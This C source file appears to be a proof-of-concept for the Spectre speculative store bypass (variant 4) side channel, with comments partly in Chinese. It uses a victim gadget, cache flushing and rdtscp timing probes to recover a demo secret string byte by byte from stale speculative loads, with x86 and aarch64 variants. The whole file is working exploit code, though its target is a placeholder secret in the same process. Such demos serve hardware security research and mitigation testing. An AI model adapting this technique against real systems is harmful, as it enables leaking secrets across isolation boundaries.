#include <stdio.h>
#include <stdint.h>

#include "cacheutils.h"

#define MAX_TRIES 10000
#define CACHE_HIT_THRESHOLD 1000 //如果没有结果，或者输出是一些垃圾数据，可以适当调大阈值


unsigned char** memory_slot_ptr[256];
unsigned char* memory_slot[256];

unsigned char secret_key[] = "The Magic Words are Squeamish Ossifrage.";
unsigned char overwrite[] = "###########################################################################";

#define LEN sizeof(secret_key)

uint8_t probe[256 * 4096];
volatile uint8_t tmp = 0;

//
void victim_function(size_t idx) {

	/*
	*spectre ssb gadget,
	*/
	unsigned char **memory_slot_slow_ptr = *memory_slot_ptr;
	*memory_slot_slow_ptr = overwrite; //slow store
	/*
	**此时的memory_slot指向的值应该是'#',但是被预测为不相关的load指令，直接从L1D中取数据，然后将之前的store数据泄漏到cache中
	*/
	tmp = probe[(*memory_slot)[idx] << 12]; //dependent WAR，but the load speculatively excuted using the stale data
}


int main(void) {
	for (int i = 0; i < sizeof(probe); ++i) {
		probe[i] = 1; // write to array2 so in RAM not copy-on-write zero pages
	}

	for (int idx = 0; idx < LEN; ++idx) {

		int results[256] = {0};
		unsigned int junk = 0;

		for (int tries = 0; tries < MAX_TRIES; tries++) {

			*memory_slot_ptr = memory_slot;
			*memory_slot = secret_key;

#if defined __aarch64__
			flush(memory_slot_ptr);
			for (int i = 0; i < 256; i++) {
				flush(&probe[i << 12]);
			}
			mfence();
#else
			_mm_clflush(memory_slot_ptr);
			for(int i = 0; i < 256; i++){
				_mm_clflush(&probe[i << 12]);
			}
			_mm_mfence();
#endif

			victim_function(idx);

			for (int i = 0; i < 256; i++) {
				uint8_t* addr = &probe[i << 12];
			

#if defined __aarch64__
				uint64_t time1 = rdtscp();
				//maccess(&junk);
				junk = *addr;
				uint64_t time2 = rdtscp() - time1;
#else
				uint64_t time1 = __rdtscp(&junk);
				junk = *addr;
				uint64_t time2 = __rdtscp(&junk) - time1;
#endif


				if (time2 <= CACHE_HIT_THRESHOLD && i != overwrite[idx]) {
					results[i]++; // cache hit
				}
			}
		}
		tmp ^= junk; // use junk so code above wont get optimized out

		int highest = -1;
		for (int i = 0; i < 256; i++) {
			if (highest < 0 || results[highest] < results[i]) {
				highest = i;
			}
		}
		printf("idx:%2d, highest:%c, hitrate:%f\n", idx, highest,
			(double)results[highest] * 100 / MAX_TRIES);
	}
}




